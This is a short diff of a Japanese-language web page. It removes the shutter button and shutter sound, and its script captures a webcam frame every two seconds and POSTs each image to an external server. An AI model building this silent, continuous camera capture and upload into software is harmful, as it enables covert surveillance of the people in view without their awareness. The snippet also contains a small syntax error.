@@ -12,13 +12,6 @@ canvas, video{
 
 	<video id="camera" width="300" height="200"></video>
 	<canvas id="picture" width="300" height="200"></canvas>
-	<form>
-		<button type="button" id="shutter">シャッター</button>
-	</form>
-
-	<audio id="se" preload="auto">
-		<source src="camera-shutter1.mp3" type="audio/mp3">
-	</audio>
 
 <script>
 window.onload = () => {
@@ -58,11 +51,12 @@ window.onload = () => {
 	let inter = setInterval(async () => {
 		const ctx = canvas.getContext("2d");
 		ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-		await XHRsend({
+		let ret = await XHRsend({
 			url : "http://nullproductivity.ml/presen/send/",
 			method : "POST",
 			data : ctx.toDataURL("image/jpeg");
 		});
+		console.log("inter");
 	},2000);
 };
 </script>
